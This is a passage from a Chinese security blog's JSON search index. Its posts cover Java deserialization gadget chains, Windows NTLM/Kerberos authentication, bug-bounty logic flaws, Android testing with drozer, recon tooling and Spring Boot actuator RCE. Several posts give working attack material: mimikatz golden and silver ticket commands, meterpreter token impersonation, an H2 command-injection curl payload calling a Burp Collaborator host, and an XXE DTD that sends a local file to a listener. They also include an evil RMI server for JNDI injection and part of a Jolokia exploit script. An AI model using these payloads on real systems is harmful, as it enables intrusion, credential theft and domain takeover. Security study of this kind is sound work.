InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers); HashMap map1 = new HashMap(); HashMap map2 = new HashMap();// map1.put(&quot;yy&quot;, 1);// map2.put(&quot;zZ&quot;, 1); map1.put(&quot;hack&quot;, -50515712); map2.put(&quot;halfblue&quot;, 4396); LazyMap lazyMap = (LazyMap) LazyMap.decorate(map2, new ConstantTransformer(1)); Hashtable hashtable = new Hashtable(); hashtable.put(map1, 1); hashtable.put(lazyMap, 2); lazyMap.remove(&quot;hack&quot;); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap,chainedTransformer); serialize(hashtable); unserialize(&quot;ser.bin&quot;); ysoserial里面的CC链就这些，实际上并不代表这些链就是完美的，了解了原理根据需要去改就行了，有点像拼乐高，一块一块的。","categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"http://yoursite.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"彻底理解windows认证","slug":"彻底理解windows认证","date":"2020-07-21T15:44:58.000Z","updated":"2020-08-12T15:50:54.000Z","comments":true,"path":"2020/07/21/彻底理解windows认证/","link":"","permalink":"http://yoursite.com/2020/07/21/%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3windows%E8%AE%A4%E8%AF%81/","excerpt":"这是篇windows域相关的知识的学习笔记，来自倾旋大佬。标题也是我从他那偷的。","text":"这是篇windows域相关的知识的学习笔记，来自倾旋大佬。标题也是我从他那偷的。1、windows本地认证就是自己的本地计算机登录过程。密码在C:\\Windwos\\System32\\config\\SAM里，登录时会进行比对。密码的存储形式是NTLM哈希，32位数字字母。流程是hex-&gt;unicode-&gt;md4 123admin -&gt; hex(16进制编码) = 61646d696e61646d696e -&gt; Unicode = 610064006d0069006e00610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634 winlogon进程接受账号密码，传给lsass进程计算哈希。以前用的是LM hash，流程如下： 1234567将密码转为大写转16进制补齐为14字节并切分成两个七字节转为二进制左边补0补齐56bit7比特一组，分成8组，末尾加0每组比特流转换为16进制作为key，对固定字符串KGS!@#$%进行des加密(这里倾旋大佬讲错了，把这个当成了key)，将结果拼接。 如果破解的话，破解过程实际是爆破des加密的密钥，因为des密钥限制在56bit，所以长度限制在了七位。还有个特点是如果密码长度不超过七位，后半段哈希是固定的AA-D3-B4-35-B5-14-04-EE对比下来其实都是爆破，只是lm hash不区分大小写，最长14位，可以对两个七位分开爆破，爆破的难度小点。2、windows网络认证局域网内能互相通信的机器默认在一个工作组下，点对点认证，可以传输文件等。工作组是逻辑概念，不同子网主机只要能通信就在一个工作组。主要研究smb认证。smb最开始是明文传输口令，后来用LM(LAN Manager Challenge/Response)协议，再后来是NTLM协议和Kerberos协议1)挑战/响应模式LM协议和NTLM协议都采用这一模式协议分三步：协商：主要用于确认双方协议版本质询：就是挑战（Chalenge）/响应（Response）认证机制起作用的范畴。验证：验证主要是在质询完成后，验证结果，是认证的最后一步。质询过程(LM/NTLMv1协议)：1.客户端向服务器端发送用户信息(用户名)请求2.服务器接受到请求，生成一个随机字符，称为”Challenge”， 使用登录用户名对应的LM/NTLM Hash作为密钥加密(简单变形后进行DES加密)Challenge， 生成Challenge1(在网络协议中称之为Net NTLM Hash)。同时，生成Challenge1后，将Challenge发送给客户端。3.客户端接受到Challenge后，使用将要登录到账户对应的LM/NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。验证： 服务器端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过。其实就是在同一加密规则下，不泄露Hash明文的条件下比较NTLM Hash是否相同。 NTLM协议分为v1和v2两种，区别在于NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。以及加密challenge的过程，v1是简单变形后进行DES加密，v2是HMAC-MD5。对于LM和NTLMv1协议，如果伪造一个server端，可以获取到Net NTLM Hash，这也是responder的原理。固定challange之后查彩虹表爆破des密钥就行了。Net-NTLM v2就没啥好办法了，爆破看字典和命了。 2)哈希传递(pass the hash/pth)功能：使用NTLM Hash在不需要账号密码的情况下完成认证从上面的质询过程中可以看出，认证过程全程是不需要密码明文的，只需要用户名和用户的NTLM Hash。所以可以利用服务器给的challenge自己计算个response通过服务器的认证，这个技巧就是哈希传递。很多工具都有这功能，Smbmap、CrackMapExec、Smbexec、Metasploit等等。3、域环境1)活动目录(active directory)活动目录存储了有关网络对象的信息，安装在域控上，对整个域进行管理，管理对象包括计算机、用户、资源、桌面等。活动目录也就是域服务。2)Kerberos认证协议Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。也就是说Kerberos可以抵抗中间人攻击。Kerberos的含义是三头犬，代表client、server、KDC(Key Distribution Center)认证中的凭证有两种：TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证。不对应具体服务。票据（Ticket）：是网络对象互相访问的凭证。对应具体服务。大概就像吃自助，TGT是入场券，Ticket是某道菜的券(奇妙比喻)。所以明显TGT更值钱。域控中和认证有关的有两部分第一是AD(account database)，它存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。第二是KDC，分为两个服务AS(Authentication Service): 为client生成TGTTGS(Ticket Granting Service): 为client生成某个服务的ticket域认证粗略流程：Ⅰ client向KDC请求，希望获取TGT以访问某个server(这一步并没有指定server信息)。 KDC首先需要判断client是否是可信赖的， AS服务通过在AD中查询来判断client是否合法。查询合法后，AS返回TGT给client。Ⅱ client得到了TGT后，带着TGT继续向KDC请求，希望获取访问指定server的权限。这个过程由TGS服务处理，TGS通过client 消息中的TGT，判断出了client拥有权限，给了client访问对应server的权限ticket。Ⅲ client得到ticket后，就可以成功访问server。这个ticket只是针对这个server，访问其他server需要再向TGS申请。从上述过程中可以看出，TGT是不对应具体server的，ticket对应具体的server。也就是说如果可以伪造TGT就可以申请任意server的ticket，登录任意server。 这个流程很粗略，缺少细节，接下来写下域认证的具体过程。为了简便，过程中很多重复出现的词我用了自己定义的符号缩写：Ⅰ client申请TGT(Authentication Service Exchange)：client向KDC的AS发送Authentication Service Request(KRB_AS_REQ)。KRB_AS_REQ的包含以下的内容：Pre-authentication data，用来证明自己是自己声明的client，实现是用户名对应的NTLM Hash(记作Kc)加密的时间戳，这里记作Kc(timestamp)client的name，记作cserver name，这个server并不是client要访问的server，因为TGT生成过程和server是无关的。这里是KDC的TGS的Server Name。记作Sclient发送KRB_AS_REQ({c,S,Kc(timestamp)})给KDC，KDC在AD查找用户c对应NTLM Hash的Kc，获取Kc后对Pre-authentication data进行解密，验证时间戳。验证通过后KDC会生成一个随机字符串Session Key(记作Ks)，但KDC并不会存储这个Ks，也就是说后续过程KDC无法验证Ks的来源(这就是后面黄金票据的原理)。之后KDC返还KRB_AS_REP给client，KRB_AS_REP包含以下内容：使用Kc对Ks加密得到的Kc(Ks)。TGT，TGT是使用krbtgt用户的NTLM Hash(记作Kkdc)加密的，形式是Kkdc{Ks，c，endTime(TGT的到期时间)}。Kc(Ks)和TGT会作为KRB_AS_REP一起返还给client。 Ⅱ 客户端申请指定server的ticket(TGS（Ticket Granting Service）Exchange)client拥有Kc，所以可以从Kc(Ks)解密获得Ks(Session key)。现在client有了Ks和TGT，向KDC中的TGS(Ticket Granting Service)发送Ticket Granting Service Request(KRB_TGS_REQ)。KRB_TGS_REQ大体包含以下的内容：TGT，TGT是Kkdc加密的，只有KDC能解密，用来验证client这一步申请的合法性。Authenticator，形式是Ks{c,s,timestamp}client的name，记作cserver的name，这次是指定要访问的那个server了，记作s获取到KRB_TGS_REQ({TGT,Ks{c,s,timestamp},c,s})后，TGS需要验证client提供的那个TGT是否是AS颁发给它的，也就是验证client提供的Authenticator。注意Authenticator使用了Ks进行加密，但KDC是没有办法直接解密的，因为KDC并没有存储Ks。所以KDC需要先使用Kkdc解密TGT获取其中的Ks，然后比对TGT中的c和该请求的c是否一致。验证通过后KDC会生成一个新的Session Key，叫做Server Session Key(记作Ks2)。之后会发送KRB_TGS_REP给client，内容如下：使用Ks对Ks2加密得到的Ks(Ks2)Ticket，Ticket是使用server的NTLM Hash(记作Kserver)加密的。形式是Kserver{Ks2，c，endTime(Ticket的到期时间)}。可以看到其实Ticket和TGT形式是一样的，只是加密密钥变了。KRB_AS_REP({Kc(Ks),TGT})和KRB_TGS_REP({Ks(Ks2),Ticket})形式也是一样的。至此client和KDC的通信过程结束，下面client直接和server通信。 Ⅲ 利用Ticket登录server(CS（Client/Server ）Exchange)客户端利用Ks解密获得Ks2，向server发送Application Service Request(KRB_AP_REQ)，KRB_AP_REQ包含以下内容：Authenticator，形式是Ks2{c,timestamp}Ticket，形式是Kserver{Ks2，c，endTime}server使用自己的Kserver解密Ticket，获得Ks2。利用Ks2解密Authenticator中的c和ticket中的c是否一致，以及时间戳是否合法。校验通过后，认证成功，该票据会一直存在客户端内存中。总的来说就是使用对称加密，验证密钥、时间戳和身份来确保合法性。(终于写完了，想起来大三的时候学这段听天书的感觉了，爷青回。) 接下来说说大家常说的白银票据和黄金票据白银票据(Silver Tickets)的特点如下:1.不需要与KDC进行交互2.需要目标服务的NTLM Hash在第三步认证中的Ticket的组成为Ticket=Kserver{Ks2，c，endTime}，所以当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。因为server是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。用mimikatz伪造白银票据 1234首先需要导出Server Hash：C:\\files&gt;mimikatz.exe &quot;privilege::debug” &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt伪造票据:mimikatz &quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit 白银票据只能针对服务器上的某些服务去伪造，如WMI、Powershell、smb等等。黄金票据(Golden Tickets)特点如下:1.需要与KDC通信2.需要krbtgt用户的hash得到krbtgt用户的hash也就是前面的Kkdc之后，就可以伪造TGT。因为前面写了TGT=Kkdc{Ks，c，endTime}，而KDC并没有存储Ks，所以这个Ks可以任意写，只要拥有Kkdc就可以伪造合法的TGT。伪造好TGT就可以向KDC申请任意server的Ticket，实现对整个域的持久控制。黄金票据虽然叫Ticket，但其实是TGT，并不是Ticket。使用mimikatz生成黄金票据 1mimikatz &quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit 可以看出有了TGT就相当于有了某个用户的权限，所以还有种和哈希传递类似的攻击，叫做票据传递(Pass The Ticket)。原理是用户登陆到计算机时，Kerberos TGT本地存储在计算机上。在计算机上具有管理员权限的攻击者能够提取所有的TGT，并使用它在网络中不同的计算机之间横向移动。对服务来说这个叫非约束委派。 4、Windows Access Token 简介Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝。Access Token分为主令牌和模拟令牌用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。所以窃取令牌可以获得登陆过已注销的用户的权限。可以使用多种工具查看目前系统上存在的模拟令牌:IncognitoPowershell - Invoke-TokenManipulation.ps1Cobalt Strike - steal_token比如用meterpreter集成的incognito 123meterpreter &gt; getsystemmeterpreter &gt; load incognito meterpreter &gt; list_tokens –umeterpreter &gt; impersonate_token &quot;PAYLOADS\\\\Administrator” 就可以获得域管权限。 看了网上很多相关的文章，看着是中国字说的不是中国话，原理可能不太难，但是看名字真不知道是什么。整理了一下这些概念，算是入了个门。 参考链接https://payloads.online/archivers/2018-11-30/1https://xz.aliyun.com/t/2445https://www.anquanke.com/post/id/194069https://blog.csdn.net/wulantian/article/details/42418231","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"逻辑漏洞部分实例总结","slug":"逻辑漏洞部分实例总结","date":"2020-07-15T08:44:44.000Z","updated":"2020-08-12T15:47:52.000Z","comments":true,"path":"2020/07/15/逻辑漏洞部分实例总结/","link":"","permalink":"http://yoursite.com/2020/07/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%83%A8%E5%88%86%E5%AE%9E%E4%BE%8B%E6%80%BB%E7%BB%93/","excerpt":"平时接触的一大半都是逻辑漏洞，很多时候其实也不算漏洞，只是功能设计有缺陷，更多的是需要改变思路，想出利用场景，改个数据包轻松高危。","text":"平时接触的一大半都是逻辑漏洞，很多时候其实也不算漏洞，只是功能设计有缺陷，更多的是需要改变思路，想出利用场景，改个数据包轻松高危。 越权类修改id越权1、在关注、点赞、评分等功能如果出现userid，可以通过遍历userid刷量。2、修改uid越权查看个人信息、订单记录、聊天记录等等。3、如果没有id字段，可以尝试添加一个user_id之类的字段，这个字段可能是其他接口有，这个接口前端没写，但实际也是可以用的。4、也可以尝试修改内容id新建或删除评论、视频等。 权限绕过密码重置1、验证码暴力破解一般是在手机号后加特殊字符绕过次数限制，比如前面加0，后面加空格或者其他字符，可以fuzz参考https://wooyun.x10sec.org/static/bugs/wooyun-2012-011720.html2、重置token可猜测有案例用的是时间戳还有可能重置链接的key是手机号+验证码的md53、越权可能会有accountid/userid之类的参数，尝试修改。有些没有校验签名，校验签名的话逻辑也在js里，可以自己调一下。一般就是参数加个字符串哈希一下。可能前面校验手机号验证码返回token了，后一步的userid参数却没校验，可以修改最后一步的参数重置密码。参考https://wooyun.x10sec.org/static/bugs/wooyun-2013-018263.html4、修改返回值前端验证，修改返回包里的邮箱/手机号/id进入下一步。抓包时请求和返回包都要看，也可能在cookie里。5、改参数键可以尝试加或者删参数，比如把验证问题删掉，或者加个userid参数尝试修改其他id，也可以多写一个id参数，类似参数污染。6、session覆盖感觉挺少见的，参考https://wooyun.x10sec.org/static/bugs/wooyun-2014-085843.html 微博oauth1、正常登录后修改返回包中的uid2、获取access_token后登录其他app，同时修改access_token和uid 付费绕过 好友验证绕过 支付相关充值1、观察是否有productid之类的参数，尝试修改为价格更低的产品。2、观察是否有amount之类的参数，修改为小数字或负数。3、创建低价订单，替换订单id4、充非常大的数或者买非常多数量的产品(1073741824/2147483647)，可能整数溢出(高危)，也可能截到一个相对小一些的数(低危或忽略)。 签约首月优惠、会员升级、优惠券等。1、二维码如果可以同时用微信或支付宝扫，就各扫一次再分别支付，可能开通两个月。2、用没钱的卡支付，创建多个优惠订单再支付获取多次优惠。3、用两个手机，都停在支付页面，先开通一个后取消自动付费再用另一个开通。 优惠券1、并发领多张2、修改id领以前的优惠券 其他并发1、并发领奖励2、并发提现3、并发支付4、并发送礼物5、并发刷赞 短信轰炸(横向、纵向)删cookie、加空格、加0 改图片长宽导致dos 细心看每个数据包就行了，挺有意思的，也没啥意思。 参考链接http://www.kb-iot.com/post/1249.html","categories":[],"tags":[{"name":"挖洞","slug":"挖洞","permalink":"http://yoursite.com/tags/%E6%8C%96%E6%B4%9E/"}]},{"title":"安卓安全新手村攻略","slug":"安卓安全新手村攻略","date":"2020-07-02T13:26:45.000Z","updated":"2020-07-10T13:00:54.000Z","comments":true,"path":"2020/07/02/安卓安全新手村攻略/","link":"","permalink":"http://yoursite.com/2020/07/02/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%E6%96%B0%E6%89%8B%E6%9D%91%E6%94%BB%E7%95%A5/","excerpt":"最近要测一些app，除了直接测web端也有覆盖移动端常见的漏洞，学学常见的安卓漏洞和drozer的用法。","text":"最近要测一些app，除了直接测web端也有覆盖移动端常见的漏洞，学学常见的安卓漏洞和drozer的用法。不懂安卓开发，所以只总结些不涉及代码的漏洞。把apk改成zip解压，查看配置文件。查看AndroidManifest.xml，了解apk结构。 123456查看permission信息,比如读写权限、网络权限等等。cat AndroidManifest.xml | grep permission查看是否允许debugcat AndroidManifest.xml | grep debug查看暴露的服务cat AndroidManifest.xml | grep exported 查看assets和res/raw/中是否有敏感信息。然后连接手机开始调试，手机打开调试模式。安装adb和drozer，教程很多。 123456789连接drozeradb forward tcp:31415 tcp:31415drozer.bat console connect获取所有app名称adbadb shell pm list packages -f namedrozerrun app.package.list -f appnamerun app.package.list -a packagename 简单的信息泄露漏洞：通过adb logcat查看本地记录，是否有明文银行卡身份证号等被记录。安卓应用有四大组件：content providers、activities、broadcast providers、sservices。activities可能有绕过的风险，比如登录界面被绕过。通过drozer测试：run app.package.attacksurface target列出所有攻击面。查看activity信息 run app.activity.info -a target权限是null的话尝试直接调用activitiy，也许有未授权访问run app.activity.start –component 应用全称 Activity名称直接调用对应的activity。还可能存在拒绝服务漏洞adb shell am start -n target/activityapp退出运行即存在漏洞测试sql注入run app.provider.finduri targetrun app.provider.query urirun scanner.provider.injection -a target","categories":[],"tags":[{"name":"挖洞","slug":"挖洞","permalink":"http://yoursite.com/tags/%E6%8C%96%E6%B4%9E/"}]},{"title":"挖洞教科书The-Bug-Hunter's-Methodology-v4.0记录","slug":"挖洞教科书The-Bug-Hunter-s-Methodology-v4-0记录","date":"2020-06-25T09:58:14.000Z","updated":"2020-08-12T15:49:22.000Z","comments":true,"path":"2020/06/25/挖洞教科书The-Bug-Hunter-s-Methodology-v4-0记录/","link":"","permalink":"http://yoursite.com/2020/06/25/%E6%8C%96%E6%B4%9E%E6%95%99%E7%A7%91%E4%B9%A6The-Bug-Hunter-s-Methodology-v4-0%E8%AE%B0%E5%BD%95/","excerpt":"jason haddix的经典教程又更新了，翻译记录下。正好最近要刷刷src。","text":"jason haddix的经典教程又更新了，翻译记录下。正好最近要刷刷src。首先作者把挖洞分成两部分：信息收集和应用分析。这个演讲是关于信息收集的。第一点是记录项目，把挖过的项目都进行整理和更新，作者用xmind这个工具。用excel或者notebook也一样，主要是记录自己的工作内容。以xmind为例，作者在左侧记录资产信息、whois信息等，右侧记录不同的域名。打开右侧的端点，一个端点对应一个域名，作者记录了该域名一些功能点，潜在的漏洞以及对应的检测方法，这样能对目标进行比较全面的梳理。比如内容发现一栏对应js分析和目录爆破。动态输入对应文件上传和可疑api。介绍完记录工具，开始介绍正式内容。 信息收集广泛的信息收集包括很多内容，如图。包括目标域、asn、whois、子域名、资产、端口等等。 收集根域名首先需要确认目标域，也就是所谓的seeds/root。一般在src都会说明接受的域名范围。但有些src会接受所有公司的资产，有一些是没有列举出来的。以tesla为例，在https://www.crunchbase.com/textsearch?q=tesla进行搜索，可以搜索到公司拥有的资产，可能有一些src没有写出但也属于目标资产的域名，这样就可以扩大目标范围。资产收集的另一个技巧是asn(autonomous system numbers)，在https://bgp.he.net/可以查询目标机构的asn和ip等信息，用以确认资产是否属于目标。另外还可以用专门的工具，metabigor(https://github.com/j3ssie/metabigor)和asnlookup(https://github.com/yassineaboukir/Asnlookup)。ip反查asn还有个国内的工具https://tools.ipip.net/as.phpasn还可以用来发现根域名，使用amass(https://github.com/OWASP/Amass)可以通过asn获取根域名： 1amass intel -asn 46489 下一个技巧是whois查询，有很多在线工具，作者使用的是whoxy.com。通过查询whois发现目标机构过去的域名，可以扩大目标范围，但也有可能会有很多过期的域名。也有人写好了工具，domlink(https://github.com/vysecurity/DomLink)下一个技巧是利用ad/analytics tracker code，可以在builtwith.com查询，在relationship profile一栏里可以找到使用相同code的域名，扩大目标范围。下一个技巧是google，除了常规的搜索，可以搜索目标的版权、隐私之类的关键词，比如”© 2019 Twitch Interactive, Inc.” inurl:twitch然后就是shodan，比较常规，直接搜域名就行。 收集子域名收集子域名主要分三部分：链接、js泄露，枚举，爆破。作者使用burp收集链接中的域名：关闭被动扫描，设置自动提交表单，设置target关键词(不是完整域名)，访问网站并爬取所有域名。设置target过程如图： 这样不仅可以获取子域名，也可能获取到新的根域名，比如以twitch为关键字获取到twitchapp.net。之后在target一栏全选，右键engagement tools里面的analyze target保存即可。这个过程也可以用自动化爬虫然后再正则提取，爬虫的话有Gospider(https://github.com/jaeles-project/gospider)和hakrawler(https://github.com/hakluke/hakrawler)还有从js获取子域名的工具，比如subdomainizer(https://github.com/nsonaniya2010/SubDomainizer)和subscraper(https://github.com/Cillian-Collins/subscraper)，国内大家可能用过jsfinder，差不多。下一个环节是子域名枚举，有很多渠道可以进行子域名枚举，包括基础资源(censys、dnsdb)、搜索引擎、证书、安全资源。这个过程中可以使用的工具有amass、subfinder(https://github.com/projectdiscovery/subfinder)。amass是作者最常用的工具，它有很多功能，比如枚举子域名时还会返回asn，这样就有可能再添加新的asn，扩大目标范围。另一个工具是github search(https://github.com/gwen001/github-search)，它利用github进行搜索，其中一个功能是搜索子域名。类似的还有shosubgo(https://github.com/incogbyte/shosubgo)，它从shodan收集子域名。一个高手都在用的技术是通过aws、gcp、azure等云服务的证书搜索寻找子域名，大概原理是遍历并匹配。但是有一些经验文章，比如https://www.daehee.com/scan-aws-ip-ssl-certificates/、https://www.youtube.com/watch?v=1pqCqz3JzXE。这里给出一个工具 1curl &#x27;https://tls.bufferover.run/dns?q=twitch.tv&#x27; 2&gt;/dev/null |jq .Results 下一个环节就是大家熟悉的子域名爆破了，作者一样使用了amass，可以自己定义dns服务器和字典。 12amass enum -brute -d twitch.tv -srcamass enum -brute -d twitch.tv -rf resolvers.txt -w bruteforce.list 其实有很多类似的工具，比如国内jiejie的和seay的子域名爆破工具，作者还提供了shuffledns(https://github.com/projectdiscovery/shuffledns)爆破的结果其实取决于字典，作者使用的字典是把过去七年所有见过的子域名收集起来组成的，有15m。当然大字典会很慢，定制字典更有效率一些。Nahamsec也有一个关于字典的pre：https://www.youtube.com/watch?v=W4_QCSIujQ4作者也给出了一个现成的字典https://github.com/assetnote/commonspeak2获取到一些子域名后，可以寻找子域名命名的规律，利用altdns(https://github.com/infosec-au/altdns)可以发现一些没有爆破出来的符合命名规律的子域名。比如 12origin-sub.target.comorigin.sub.target.com 这两个可能解析的是同一个网站，但有可能一个有waf一个没有，也是种绕过waf的手段。最后就是端口扫描，可以先用masscan扫描打开的端口然后再用nmap确认具体端口信息，相比直接用nmap扫会快不少。因为masscan只接受ip作为参数，可以用dnmasscan(https://github.com/rastating/dnmasscan)自动把域名转换为ip再调用masscan。作者还给了个masscan的教程https://danielmiessler.com/study/masscan/在masscan和nmap扫描得到结果之后，可以利用brutespray(https://github.com/x90skysn3k/brutespray)对ftp/ssh/mysql等认证服务进行弱口令爆破子域名扫描的时候可以去github查找是否有信息泄露，也是利用前面说的github-search这个工具。Bugcrowd University有个教程：https://www.youtube.com/watch?v=l0YsEk_59fQ因为已经有了非常多子域名，下一步可以用眼睛来看。比起一个一个点，用工具自动截图更方便。作者给出了几个工具，包括aquatone、HTTPscreenshot、eyewitness。作者用最后一个，但其实都差不多。不过这只是可选项，作者大部分时候也是一个一个点开，因为可能会有跳转之类的问题。接下来要检测的是子域名接管，这是有域名就能测试的一个漏洞并且是个高危漏洞。原理在https://github.com/EdOverflow/can-i-take-over-xyz作者给了两个子域名接管的工具，https://github.com/Ice3man543/SubOver和https://github.com/projectdiscovery/nuclei最后就是框架部分。作者把信息收集框架分为几类。C类是简单的脚本，调用其他现有的工具。B类是自己写的模块，有图形界面或工作流。A类是自写模块，有图形界面，使用数据库迭代更新。S类就是再加上写自动提醒、机器学习之类的技术。作者给出了一些例子(oneforall瞩目) 不过S类的基本都是付费并且只面向公司的，据说intrigue.io核心部分是开源的。总的来说都是些信息收集的姿势，有一些还算比较新颖，并且也给出了许多工具，可以试着更新下自己的工具集。下一篇具体挖洞的还要过阵子才有。","categories":[],"tags":[{"name":"挖洞","slug":"挖洞","permalink":"http://yoursite.com/tags/%E6%8C%96%E6%B4%9E/"}]},{"title":"springboot下rce的多种姿势","slug":"springboot下rce的多种姿势","date":"2020-06-03T13:01:47.000Z","updated":"2020-06-08T14:25:32.000Z","comments":true,"path":"2020/06/03/springboot下rce的多种姿势/","link":"","permalink":"http://yoursite.com/2020/06/03/springboot%E4%B8%8Brce%E7%9A%84%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF/","excerpt":"springboot actuator除了信息泄露，更大的危害是可能导致rce，记录一下。","text":"springboot actuator除了信息泄露，更大的危害是可能导致rce，记录一下。首先查看是否有env路由，不一定在根目录下，可能在二级目录下。找到后查看是否允许post请求，能的话可以尝试rce，有几种方法。 springboot2第一种是最新的，需要springboot2，开启restart路由。流程很简单，首先修改spring.datasource.hikari.connection-test-query，创建一个新的数据库连接时这个变量的值就会执行，修改它为命令执行的代码 1curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\\&quot;name\\&quot;:\\&quot;spring.datasource.hikari.connection-test-query\\&quot;,\\&quot;value\\&quot;:\\&quot;CREATE ALIAS EXEC AS CONCAT(\\&#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\\&#x27;,\\&#x27; java.util.Scanner(Runtime.getRun\\&#x27;,\\&#x27;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\\&#x27;);CALL EXEC(\\&#x27;curl http://x.burpcollaborator.net\\&#x27;);\\&quot;&#125;&#x27; &#x27;http://localhost:8080/actuator/env&#x27; 然后重启应用 1curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; &#x27;http://localhost:8080/actuator/restart&#x27; 我这里用作者给的docker实验，不知道为什么用burp的collaborator收不到请求，用vps开了个端口收到了。但是命令执行后程序就会退出，不知道是特例还是共性。后几种都是springboot1下的。 jolokia1第一种是利用jolokia。首先访问jolokia/list，查看是否存在reloadByURL，有的话就可以利用。漏洞环境https://github.com/veracode-research/actuator-testbed首先可以xxe 12345678&lt;!--logback.xml--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:9999/file.dtd&quot;&gt;%remote;%int;]&gt;&lt;a&gt;&amp;trick;&lt;/a&gt;&lt;!--file.dtd--&gt;&lt;!ENTITY % d SYSTEM &quot;file:///C:/wamp/1.txt&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#x27;http://127.0.0.1:9999/%d;&#x27;&gt;&quot;&gt; 访问http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/127.0.0.1:9999!/logback.xml即可完成攻击然后还可以实现rce，利用的是JNDI注入。修改logback.xml 123&lt;configuration&gt; &lt;insertFromJNDI env-entry-name=&quot;rmi://127.0.0.1:1097/jndi&quot; as=&quot;appName&quot; /&gt;&lt;/configuration&gt; 修改rmiserver，代码来自https://github.com/mpgn/Spring-Boot-Actuator-Exploit 12345678910111213141516171819202122import java.rmi.registry.*;import com.sun.jndi.rmi.registry.*;import javax.naming.*;import org.apache.naming.ResourceRef; public class EvilRMIServer &#123; public static void main(String[] args) throws Exception &#123; System.out.println(&quot;Creating evil RMI registry on port 1097&quot;); Registry registry = LocateRegistry.createRegistry(1097); //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null); //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;)); //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).eval(\\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,&#x27;calc.exe&#x27;]).start()\\&quot;)&quot;)); ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref); registry.bind(&quot;jndi&quot;, referenceWrapper); &#125;&#125; 启动rmi服务 1java -Djava.rmi.server.hostname=127.0.0.1 -jar RMIServer-0.1.0.jar 还是访问同一个链接，执行命令。 jolokia2jolokia还有一种jndi注入rce的方法，查看/jolokia/list中org.apache.catalina.mbeans.MBeanFactory是否存在。直接python打，还是自己起一个rmiserver 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#-*-coding:utf8-*-import requests as reqimport sysfrom pprint import pprinturl = sys.argv[1] + &quot;/jolokia/&quot;pprint(url)#创建JNDIRealmcreate_JNDIrealm = &#123; &quot;mbean&quot;: &quot;Tomcat:type=MBeanFactory&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;operation&quot;: &quot;createJNDIRealm&quot;, &quot;arguments&quot;: [&quot;Tomcat:type=Engine&quot;]&#125;#写入contextFactoryset_contextFactory = &#123; &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;, &quot;type&quot;: &quot;WRITE&quot;, &quot;attribute&quot;: &quot;contextFactory&quot;, &quot;value&quot;: &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;&#125;#写入connectionURL为自己公网RMI service地址set_connectionURL = &#123; &quot;mbean&quot;: &quot;Tomcat:realmPath=/realm0,type=Realm&quot;, &quot;type&quot;: &quot;WRITE&quot;, 